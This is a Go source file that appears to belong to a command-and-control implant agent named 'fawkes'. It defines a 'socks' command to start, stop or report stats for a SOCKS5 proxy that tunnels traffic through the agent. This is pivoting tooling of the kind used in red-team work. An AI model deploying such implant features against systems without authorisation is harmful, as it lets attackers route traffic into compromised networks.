package commands

import (
	"fawkes/pkg/socks"
	"fawkes/pkg/structs"
)

// SocksCommand implements the socks command
type SocksCommand struct{}

type socksArgs struct {
	Action string `json:"action"`
	Port   int    `json:"port"`
}

func (c *SocksCommand) Name() string {
	return "socks"
}

func (c *SocksCommand) Description() string {
	return "Start, stop, or view stats for the SOCKS5 proxy"
}

// gSocksManager holds a reference to the active SOCKS manager for stats access.
// Set by RegisterSocksManager during agent initialization.
var gSocksManager *socks.Manager

// RegisterSocksManager stores a reference to the SOCKS manager for stats access.
func RegisterSocksManager(m *socks.Manager) {
	gSocksManager = m
}

func (c *SocksCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[socksArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch params.Action {
	case "start":
		return successf("[+] SOCKS5 proxy active on server port %d. Agent is processing proxy traffic.", params.Port)
	case "stop":
		return successf("[+] SOCKS5 proxy on port %d stopped.", params.Port)
	case "stats":
		return socksStats()
	default:
		return errorf("Unknown action: %s (use 'start', 'stop', or 'stats')", params.Action)
	}
}

func socksStats() structs.CommandResult {
	if gSocksManager == nil {
		return errorResult("SOCKS manager not initialized")
	}
	return successResult(gSocksManager.Stats.Summary())
}
